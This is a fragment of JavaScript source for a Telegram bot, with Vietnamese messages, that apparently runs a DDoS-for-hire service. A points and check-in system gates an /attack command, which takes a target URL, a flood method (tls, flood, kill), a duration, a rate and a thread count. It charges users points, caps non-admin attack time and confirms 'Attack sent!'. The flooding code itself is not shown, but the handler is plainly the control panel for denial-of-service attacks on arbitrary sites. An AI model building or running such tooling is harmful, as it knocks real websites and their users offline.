...
CREATE TABLE IF NOT EXISTS users (userId INTEGER PRIMARY KEY, points INTEGER DEFAULT 0, lastCheckin TEXT);`);
...
const addUser = db.prepare("INSERT OR IGNORE INTO users (userId, points, lastCheckin) VALUES (?, 0, '')");
...
bot.onText(/\/checkin/, (msg) => {
  ...
  bot.sendMessage(chatId, `✅ Điểm danh thành công! +300 điểm\nSố điểm hiện tại: ${newPoints}`, { parse_mode: "Markdown" });
});
...
bot.onText(/\/attack (.+?) (tls|flood|kill) (\d+)(?:\s+-r\s+(\d+))?(?:\s+-t\s+(\d+))?/, (msg, match) => {
  ...
  addUser.run(userId);
  const user = getUser.get(userId);
  if (user.points < 100 && !admins.includes(userId)) {
  ...
  if (!admins.includes(userId) && time > 120) {
    time = 120;
  }
  syncSlotsFromDb();
  ...
  setSetting.run("activeSlots", activeSlots.toString());
  lastAttackTime = now;
  bot.sendMessage(chatId, `*🔫 Attack sent!*\n\n*URL:* \`${url}\`\n*Method:* \`${method}\`\n*Thời gian:* \`${time}s\`\n*Rate:* \`${rate}\`\n*Threads:* \`${threads}\`${!admins.includes(userId) ? `\n*Điểm còn lại:* \`${user.points - 100}\`` : ''}`, { parse_mode: "Markdown" });
